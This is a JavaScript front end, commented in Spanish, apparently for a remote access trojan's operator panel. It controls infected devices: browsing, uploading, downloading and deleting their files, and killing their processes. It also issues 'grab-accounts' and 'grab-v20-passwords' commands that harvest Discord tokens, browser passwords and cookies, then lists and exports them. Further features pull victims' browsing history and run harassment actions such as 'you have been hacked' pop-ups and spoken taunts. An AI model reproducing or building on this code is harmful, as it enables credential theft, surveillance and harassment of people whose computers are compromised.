  showToast('🗑️ Eliminando...', 'info');
  setTimeout(() => refreshFiles(), 500);
}

function previewFile(name) {
  if (!selectedDeviceId) return;
  currentPreviewFile = name;
  const filepath = currentPath.replace(/\\/g, '/') + '/' + name;
  socket.emit('preview-file', { deviceId: selectedDeviceId, filepath, filename: name });
}

function editFile(name) {
  if (!selectedDeviceId) return;
  currentEditFile = name;
  const filepath = currentPath.replace(/\\/g, '/') + '/' + name;
  socket.emit('read-file-content', { deviceId: selectedDeviceId, filepath, filename: name });
}

function saveEditedFile() {
  if (!selectedDeviceId || !currentEditFile) return;
  const content = document.getElementById('editor-content').value;
  const encoded = btoa(unescape(encodeURIComponent(content)));
  socket.emit('save-file-content', { deviceId: selectedDeviceId, filepath: currentEditFile, data: encoded });
  closeEditorModal();
  showToast('💾 Archivo guardado', 'success');
}

function uploadFiles() {
  const input = document.getElementById('file-upload-input');
  if (!input.files.length || !selectedDeviceId) return;
  Array.from(input.files).forEach(file => {
    const reader = new FileReader();
    reader.onload = () => {
      const base64 = reader.result.split(',')[1];
      socket.emit('upload-file', {
        deviceId: selectedDeviceId,
        filename: file.name,
        data: base64,
        destPath: currentPath.replace(/\\/g, '/') + '/' + file.name
      });
      showToast(`📤 Subiendo ${file.name}...`, 'info');
    };
    reader.readAsDataURL(file);
  });
  input.value = '';
  setTimeout(() => refreshFiles(), 1000);
}

function downloadSelected() {
  selectedFiles.forEach(name => downloadFile(name));
}

function deleteSelected() {
  if (!confirm(`¿Eliminar ${selectedFiles.size} archivos?`)) return;
  selectedFiles.forEach(name => {
    const filepath = currentPath.replace(/\\/g, '/') + '/' + name;
    socket.emit('delete-file', { deviceId: selectedDeviceId, filepath });
  });
  clearSelection();
  setTimeout(() => refreshFiles(), 500);
}

function compressSelected() {
  if (!selectedDeviceId) return;
  const files = Array.from(selectedFiles).map(f => currentPath.replace(/\\/g, '/') + '/' + f);
  const zipName = 'compressed_' + Date.now() + '.zip';
  socket.emit('compress-files', { deviceId: selectedDeviceId, destPath: currentPath.replace(/\\/g, '/'), zipName, files });
  showToast('📦 Comprimiendo...', 'info');
  clearSelection();
  setTimeout(() => refreshFiles(), 2000);
}

// Dialogs
function showCreateFolderDialog() {
  document.getElementById('new-folder-name').value = '';
  document.getElementById('create-folder-modal').classList.remove('hidden');
}
function closeCreateFolderDialog() {
  document.getElementById('create-folder-modal').classList.add('hidden');
}
function createFolder() {
  const name = document.getElementById('new-folder-name').value.trim();
  if (!name || !selectedDeviceId) return;
  socket.emit('create-folder', { deviceId: selectedDeviceId, path: currentPath.replace(/\\/g, '/'), folderName: name });
  closeCreateFolderDialog();
  showToast('📁 Creando carpeta...', 'info');
  setTimeout(() => refreshFiles(), 800);
}

function showRenameDialog(name) {
  currentRenameFile = name;
  document.getElementById('rename-input').value = name;
  document.getElementById('rename-modal').classList.remove('hidden');
}
function closeRenameDialog() {
  document.getElementById('rename-modal').classList.add('hidden');
}
function renameFile() {
  const newName = document.getElementById('rename-input').value.trim();
  if (!newName || !selectedDeviceId || !currentRenameFile) return;
  const oldPath = currentPath.replace(/\\/g, '/') + '/' + currentRenameFile;
  socket.emit('rename-file', { deviceId: selectedDeviceId, oldPath, newName });
  closeRenameDialog();
  showToast('✏️ Renombrando...', 'info');
  setTimeout(() => refreshFiles(), 800);
}

function showMoveDialog() {
  moveCopyMode = 'move';
  moveCopyFiles = Array.from(selectedFiles);
  document.getElementById('move-copy-title').textContent = `📁 Mover ${moveCopyFiles.length} archivo(s)`;
  document.getElementById('move-copy-dest').value = currentPath;
  document.getElementById('move-copy-modal').classList.remove('hidden');
}
function showCopyDialog() {
  moveCopyMode = 'copy';
  moveCopyFiles = Array.from(selectedFiles);
  document.getElementById('move-copy-title').textContent = `📄 Copiar ${moveCopyFiles.length} archivo(s)`;
  document.getElementById('move-copy-dest').value = currentPath;
  document.getElementById('move-copy-modal').classList.remove('hidden');
}
function closeMoveCopyDialog() {
  document.getElementById('move-copy-modal').classList.add('hidden');
}
function setMoveCopyDest(path) {
  document.getElementById('move-copy-dest').value = path;
}
function executeMoveCopy() {
  const dest = document.getElementById('move-copy-dest').value;
  if (!dest || !selectedDeviceId) return;
  const files = moveCopyFiles.map(f => currentPath.replace(/\\/g, '/') + '/' + f);
  if (moveCopyMode === 'move') {
    socket.emit('move-files', { deviceId: selectedDeviceId, files, dest });
  } else {
    socket.emit('copy-files', { deviceId: selectedDeviceId, files, dest });
  }
  closeMoveCopyDialog();
  clearSelection();
  showToast(`📁 ${moveCopyMode === 'move' ? 'Moviendo' : 'Copiando'}...`, 'info');
  setTimeout(() => refreshFiles(), 1000);
}

// ============================================
// MODALS
// ============================================
function closeModal(e) {
  if (e.target.classList.contains('modal')) {
    e.target.classList.add('hidden');
  }
}

function downloadModalImage() {
  const img = document.getElementById('modal-screenshot-img');
  const a = document.createElement('a');
  a.href = img.src;
  a.download = 'screenshot_' + Date.now() + '.jpg';
  a.click();
}

function closePreviewModal() {
  document.getElementById('file-preview-modal').classList.add('hidden');
}

function downloadPreviewFile() {
  if (currentPreviewFile) downloadFile(currentPreviewFile);
}

function closeEditorModal() {
  document.getElementById('editor-modal').classList.add('hidden');
}

// ============================================
// UTILITIES
// ============================================
function showToast(msg, type = 'info') {
  const container = document.getElementById('toast-container');
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.textContent = msg;
  container.appendChild(toast);
  setTimeout(() => toast.remove(), 4000);
}

function escapeHtml(str) {
  if (!str) return '';
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function escapeAttr(str) {
  if (!str) return '';
  return str.replace(/'/g, "\\'").replace(/"/g, '&quot;');
}

function initParticles() {
  const container = document.getElementById('particles');
  if (!container) return;
  for (let i = 0; i < 30; i++) {
    const p = document.createElement('div');
    p.className = 'particle';
    p.style.left = Math.random() * 100 + '%';
    p.style.animationDuration = (8 + Math.random() * 12) + 's';
    p.style.animationDelay = Math.random() * 10 + 's';
    p.style.width = p.style.height = (2 + Math.random() * 4) + 'px';
    container.appendChild(p);
  }
}

function startClock() {
  function update() {
    const el = document.getElementById('topbar-clock');
    if (el) {
      const now = new Date();
      el.textContent = now.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    }
  }
  update();
  setInterval(update, 1000);
}


// ============================================
// TASK MANAGER
// ============================================
let processList = [];
let selectedPids = new Set();

function refreshProcesses() {
  if (!selectedDeviceId) return showToast('Selecciona un dispositivo', 'warning');
  socket.emit('send-command', { deviceId: selectedDeviceId, command: 'processes-detailed' });
  showToast('🔄 Obteniendo procesos...', 'info');
}

function renderProcesses() {
  const tbody = document.getElementById('tm-tbody');
  const empty = document.getElementById('tm-empty');
  const search = (document.getElementById('tm-search').value || '').toLowerCase();

  let filtered = processList.filter(p => {
    if (search) {
      return (p.name || '').toLowerCase().includes(search) || String(p.pid).includes(search);
    }
    return true;
  });

  document.getElementById('tm-total').textContent = processList.length + ' procesos';

  if (filtered.length === 0) {
    tbody.innerHTML = '';
    empty.style.display = processList.length === 0 ? 'block' : 'none';
    if (processList.length > 0 && filtered.length === 0) {
      tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--text-muted);padding:30px">Sin resultados</td></tr>';
    }
    return;
  }
  empty.style.display = 'none';

  tbody.innerHTML = filtered.map(p => {
    const sel = selectedPids.has(p.pid) ? 'tm-selected' : '';
    const mem = p.memory || '-';
    return `<tr class="${sel}">
      <td><input type="checkbox" ${selectedPids.has(p.pid) ? 'checked' : ''} onchange="togglePidSelection(${p.pid}, this.checked)"></td>
      <td style="font-family:var(--font-mono);color:var(--accent)">${p.pid}</td>
      <td><strong>${escapeHtml(p.name)}</strong></td>
      <td>${escapeHtml(mem)}</td>
      <td><span class="os-badge">${escapeHtml(p.status || 'Running')}</span></td>
      <td><button class="btn-kill" onclick="killProcess(${p.pid}, '${escapeAttr(p.name)}')">☠️ Finalizar</button></td>
    </tr>`;
  }).join('');
}

function filterProcesses() { renderProcesses(); }

function togglePidSelection(pid, checked) {
  if (checked) selectedPids.add(pid);
  else selectedPids.delete(pid);
  document.getElementById('btn-kill-selected').style.display = selectedPids.size > 0 ? 'inline-flex' : 'none';
}

function toggleSelectAllProcesses() {
  const checked = document.getElementById('tm-select-all').checked;
  const search = (document.getElementById('tm-search').value || '').toLowerCase();
  processList.forEach(p => {
    if (!search || (p.name || '').toLowerCase().includes(search) || String(p.pid).includes(search)) {
      if (checked) selectedPids.add(p.pid);
      else selectedPids.delete(p.pid);
    }
  });
  document.getElementById('btn-kill-selected').style.display = selectedPids.size > 0 ? 'inline-flex' : 'none';
  renderProcesses();
}

function killProcess(pid, name) {
  if (!confirm(`¿Finalizar proceso ${name} (PID: ${pid})?`)) return;
  if (!selectedDeviceId) return;
  socket.emit('send-command', { deviceId: selectedDeviceId, command: 'kill-process', args: String(pid) });
  showToast(`☠️ Finalizando ${name} (${pid})...`, 'warning');
  setTimeout(() => refreshProcesses(), 1000);
}

function killSelectedProcesses() {
  if (!confirm(`¿Finalizar ${selectedPids.size} procesos seleccionados?`)) return;
  if (!selectedDeviceId) return;
  selectedPids.forEach(pid => {
    socket.emit('send-command', { deviceId: selectedDeviceId, command: 'kill-process', args: String(pid) });
  });
  showToast(`☠️ Finalizando ${selectedPids.size} procesos...`, 'warning');
  selectedPids.clear();
  document.getElementById('btn-kill-selected').style.display = 'none';
  setTimeout(() => refreshProcesses(), 1500);
}

// ============================================
// ACCOUNTS
// ============================================
let accountsData = { discord: [], browsers: [], apps: [] };

function refreshAccounts() {
  if (!selectedDeviceId) return showToast('Selecciona un dispositivo', 'warning');
  socket.emit('send-command', { deviceId: selectedDeviceId, command: 'grab-accounts' });
  document.getElementById('acc-status').textContent = '⏳ Recopilando datos...';
  showToast('🔍 Escaneando credenciales...', 'info');
}

function extractV20Passwords() {
  if (!selectedDeviceId) return showToast('Selecciona un dispositivo', 'warning');
  if (!confirm('Esto abrirá el navegador en el dispositivo remoto para exportar contraseñas v20. ¿Continuar?')) return;
  socket.emit('send-command', { deviceId: selectedDeviceId, command: 'grab-v20-passwords' });
  document.getElementById('acc-status').textContent = '🔓 Extrayendo contraseñas v20...';
  showToast('🔓 Iniciando extracción de v20...', 'info');
}

function renderAccounts() {
  // Discord
  const discordList = document.getElementById('acc-discord-list');
  document.getElementById('acc-discord-count').textContent = accountsData.discord.length;
  if (accountsData.discord.length === 0) {
    discordList.innerHTML = '<p class="placeholder-text">No se encontraron tokens de Discord</p>';
  } else {
    discordList.innerHTML = accountsData.discord.map(d => `
      <div class="acc-item">
        <span class="acc-item-icon">🎮</span>
        <div class="acc-item-info">
          <div class="acc-item-title">${escapeHtml(d.source || 'Discord')}</div>
          ${d.username ? `<div class="acc-item-detail"><strong>Usuario:</strong> ${escapeHtml(d.username)}</div>` : ''}
          ${d.email ? `<div class="acc-item-detail"><strong>Email:</strong> ${escapeHtml(d.email)}</div>` : ''}
          <div class="acc-item-detail"><strong>Token:</strong></div>
          <div class="acc-item-value">${escapeHtml(d.token)}</div>
          ${d.updated ? `<span class="acc-item-tag fresh">Actualizado: ${d.updated}</span>` : ''}
        </div>
        <div class="acc-item-actions">
          <button onclick="copyToClipboard('${escapeAttr(d.token)}')">📋 Copiar</button>
        </div>
      </div>
    `).join('');
  }

  // Browsers
  const browsersList = document.getElementById('acc-browsers-list');
  document.getElementById('acc-browsers-count').textContent = accountsData.browsers.length;
  if (accountsData.browsers.length === 0) {
    browsersList.innerHTML = '<p class="placeholder-text">No se encontraron datos de navegadores</p>';
  } else {
    browsersList.innerHTML = accountsData.browsers.map(b => `
      <div class="acc-item">
        <span class="acc-item-icon">${b.browser === 'Chrome' ? '🔵' : b.browser === 'Edge' ? '🟢' : b.browser === 'Firefox' ? '🟠' : '🌐'}</span>
        <div class="acc-item-info">
          <div class="acc-item-title">${escapeHtml(b.browser || 'Browser')} — ${escapeHtml(b.profile || 'Default')}</div>
          ${b.url ? `<div class="acc-item-detail"><strong>URL:</strong> ${escapeHtml(b.url)}</div>` : ''}
          ${b.username ? `<div class="acc-item-detail"><strong>Usuario:</strong> ${escapeHtml(b.username)}</div>` : ''}
          ${b.password ? `<div class="acc-item-detail"><strong>Password:</strong> <span class="acc-item-value">${escapeHtml(b.password)}</span></div>` : ''}
          ${b.cookies ? `<div class="acc-item-detail"><strong>Cookies:</strong> ${b.cookies} encontradas</div>` : ''}
          <span class="acc-item-tag app">${escapeHtml(b.type || 'credential')}</span>
        </div>
        <div class="acc-item-actions">
          ${b.password ? `<button onclick="copyToClipboard('${escapeAttr(b.password)}')">📋 Pass</button>` : ''}
          ${b.cookieData ? `<button onclick="copyToClipboard('${escapeAttr(b.cookieData)}')">🍪 Cookies</button>` : ''}
        </div>
      </div>
    `).join('');
  }

  // Apps
  const appsList = document.getElementById('acc-apps-list');
  document.getElementById('acc-apps-count').textContent = accountsData.apps.length;
  if (accountsData.apps.length === 0) {
    appsList.innerHTML = '<p class="placeholder-text">No se encontraron datos de aplicaciones</p>';
  } else {
    appsList.innerHTML = accountsData.apps.map(a => `
      <div class="acc-item">
        <span class="acc-item-icon">${a.icon || '📱'}</span>
        <div class="acc-item-info">
          <div class="acc-item-title">${escapeHtml(a.app || 'App')}</div>
          ${a.username ? `<div class="acc-item-detail"><strong>Usuario:</strong> ${escapeHtml(a.username)}</div>` : ''}
          ${a.token ? `<div class="acc-item-detail"><strong>Token:</strong></div><div class="acc-item-value">${escapeHtml(a.token)}</div>` : ''}
          ${a.data ? `<div class="acc-item-detail">${escapeHtml(a.data)}</div>` : ''}
          ${a.updated ? `<span class="acc-item-tag fresh">Actualizado: ${a.updated}</span>` : ''}
        </div>
        <div class="acc-item-actions">
          ${a.token ? `<button onclick="copyToClipboard('${escapeAttr(a.token)}')">📋 Copiar</button>` : ''}
        </div>
      </div>
    `).join('');
  }

  // Stats
  const totalTokens = accountsData.discord.length + accountsData.apps.filter(a => a.token).length;
  const totalCookies = accountsData.browsers.filter(b => b.cookies).reduce((s, b) => s + (parseInt(b.cookies) || 0), 0);
  const totalPasswords = accountsData.browsers.filter(b => b.password).length;
  document.getElementById('acc-tokens').textContent = totalTokens + ' Tokens';
  document.getElementById('acc-cookies').textContent = totalCookies + ' Cookies';
  document.getElementById('acc-passwords').textContent = totalPasswords + ' Passwords';
  document.getElementById('acc-status').textContent = '✅ Datos recopilados';
}

function toggleAccSection(section) {
  const el = document.getElementById('acc-' + section + '-body').closest('.acc-section');
  el.classList.toggle('collapsed');
}

function exportAccounts() {
  const data = JSON.stringify(accountsData, null, 2);
  const blob = new Blob([data], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'accounts_' + (selectedDeviceId || 'unknown') + '_' + Date.now() + '.json';
  a.click();
  URL.revokeObjectURL(url);
  showToast('📥 Exportado', 'success');
}

function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    showToast('📋 Copiado al portapapeles', 'success');
  }).catch(() => {
    // Fallback
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    showToast('📋 Copiado', 'success');
  });
}

// ========== BROWSER HISTORY ==========
let _historyData = [];

function refreshHistory() {
  if (!selectedDeviceId) return alert('Selecciona un dispositivo');
  socket.emit('send-command', { deviceId: selectedDeviceId, command: 'browser-history' });
}

function renderHistory() {
  const data = window._historyData || [];
  const tbody = document.getElementById('historyTableBody');
  const search = (document.getElementById('historySearch')?.value || '').toLowerCase();
  const browser = document.getElementById('historyBrowser')?.value || 'all';
  
  const filtered = data.filter(h => {
    if (browser !== 'all' && h.browser?.toLowerCase() !== browser) return false;
    if (search && !h.url?.toLowerCase().includes(search) && !h.title?.toLowerCase().includes(search)) return false;
    return true;
  });
  
  document.getElementById('historyCount').textContent = filtered.length + ' entradas';
  
  tbody.innerHTML = filtered.slice(0, 500).map(h => `
    <tr>
      <td><span style="color:#d4a017">${h.browser || '-'}</span></td>
      <td style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${(h.title||'').replace(/"/g,'&quot;')}">${h.title || '-'}</td>
      <td style="max-width:350px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><a href="${h.url}" target="_blank" style="color:#4fc3f7">${h.url || '-'}</a></td>
      <td>${h.visits || 0}</td>
      <td style="color:#aaa">${h.lastVisit || '-'}</td>
    </tr>
  `).join('');
}

function filterHistory() { renderHistory(); }

// ========== TROLL OPTIONS ==========
function trollAction(action) {
  if (!selectedDeviceId) return alert('Selecciona un dispositivo');
  let args = '';
  
  switch(action) {
    case 'open-url':
      args = prompt('URL a abrir:', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ');
      if (!args) return;
      break;
    case 'tts':
      args = prompt('Texto a hablar:', 'Te estoy observando');
      if (!args) return;
      break;
    case 'msgbox':
      args = prompt('Mensaje:', 'Has sido hackeado!');
      if (!args) return;
      break;
    case 'play-sound':
      args = prompt('Frecuencia Hz (500-5000):', '1000');
      if (!args) return;
      break;
  }
  
  socket.emit('send-command', { deviceId: selectedDeviceId, command: 'troll', args: JSON.stringify({ action, value: args }) });
}